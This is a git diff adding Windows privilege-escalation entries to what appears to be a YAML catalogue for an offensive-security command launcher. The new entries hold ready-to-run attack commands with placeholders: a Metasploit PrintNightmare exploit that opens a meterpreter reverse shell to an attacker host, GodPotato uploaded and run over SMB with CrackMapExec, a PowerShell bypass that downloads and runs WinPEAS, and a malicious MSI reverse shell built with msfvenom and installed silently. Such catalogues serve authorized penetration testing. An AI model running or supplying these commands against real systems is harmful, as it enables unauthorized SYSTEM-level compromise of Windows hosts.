@@ -197,3 +197,71 @@ tools:
         required: true
     tags: [privesc, windows, runas, lateral-movement]
     notes: "Sin GUI no funciona (la prompt de contraseña no acepta input en shells no interactivas)."
+
+  # ─────────────────────────────────────────────
+  # MODERN WINDOWS PRIVESC (2021-2024)
+  # ─────────────────────────────────────────────
+
+  - id: printnightmare_lpe
+    name: "PrintNightmare CVE-2021-34527 (LPE)"
+    description: "Escalada local a SYSTEM via Print Spooler (PrintNightmare)"
+    command: "msfconsole -q -x 'use exploit/windows/local/cve_2021_1675_printnightmare; set SESSION {session}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run; sleep 15; sessions -i -1 -c \"getuid; getsystem\"; sleep 3; exit' 2>/dev/null"
+    params:
+      - name: session
+        label: "ID de sesion MSF existente"
+        placeholder: "1"
+        required: true
+      - name: lhost
+        label: "LHOST atacante"
+        placeholder: "10.10.14.1"
+        required: true
+      - name: lport
+        label: "LPORT nuevo"
+        placeholder: "4445"
+        default: "4445"
+    tags: [privesc, windows, printnightmare, cve-2021-34527, spooler]
+    notes: "Requiere sesion MSF preexistente. Afecta Windows con Print Spooler activo."
+
+  - id: token_impersonation_godpotato
+    name: "GodPotato - Token Impersonation a SYSTEM"
+    description: "Escalada a SYSTEM via SeImpersonatePrivilege con GodPotato"
+    command: "# Transferir GodPotato al target y ejecutar:\ncrackmapexec smb {target} -u '{user}' -p '{password}' --put-file /opt/GodPotato.exe C:\\Windows\\Temp\\gp.exe 2>/dev/null; crackmapexec smb {target} -u '{user}' -p '{password}' -x 'C:\\Windows\\Temp\\gp.exe -cmd \"whoami\"' 2>/dev/null | head -5"
+    params:
+      - name: target
+        label: "Target IP"
+        placeholder: "10.10.10.10"
+        required: true
+      - name: user
+        label: "Usuario"
+        placeholder: "iis apppool\\defaultapppool"
+        required: true
+      - name: password
+        label: "Contrasena"
+        placeholder: "password"
+        required: true
+    tags: [privesc, windows, token-impersonation, godpotato, seimpersonate]
+    notes: "Funciona con SeImpersonatePrivilege (IIS, SQL Server service accounts). Alternativa: PrintSpoofer64.exe -i -c cmd"
+
+  - id: winpeas_full
+    name: "WinPEAS - Full Windows PrivEsc Audit"
+    description: "Ejecucion completa de WinPEAS para detectar vectores de escalada"
+    command: "# Descargar y ejecutar WinPEAS:\npowershell -ep bypass -c \"$client=New-Object System.Net.WebClient; $client.DownloadFile('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe','C:\\Windows\\Temp\\wp.exe'); C:\\Windows\\Temp\\wp.exe\" 2>&1 | head -200"
+    params: []
+    tags: [privesc, windows, winpeas, audit, enumeration]
+    notes: "Puede tardar varios minutos. Buscar texto rojo (critico) o amarillo (potencial). Guardar output: winPEASx64.exe > winpeas.txt"
+
+  - id: always_install_elevated
+    name: "AlwaysInstallElevated - MSI como SYSTEM"
+    description: "Si AlwaysInstallElevated=1, cualquier MSI se ejecuta como SYSTEM"
+    command: "# Verificar registro:\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul\n# Generar MSI malicioso (en Kali):\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f msi -o /tmp/evil.msi\n# Ejecutar en target:\nmsiexec /quiet /qn /i evil.msi"
+    params:
+      - name: lhost
+        label: "LHOST atacante"
+        placeholder: "10.10.14.1"
+        required: true
+      - name: lport
+        label: "LPORT"
+        placeholder: "4444"
+        default: "4444"
+    tags: [privesc, windows, alwaysinstallelevated, msi, registry]
+    notes: "Ambas claves deben estar en 1 para ser explotable. Muy comun en entornos mal configurados."
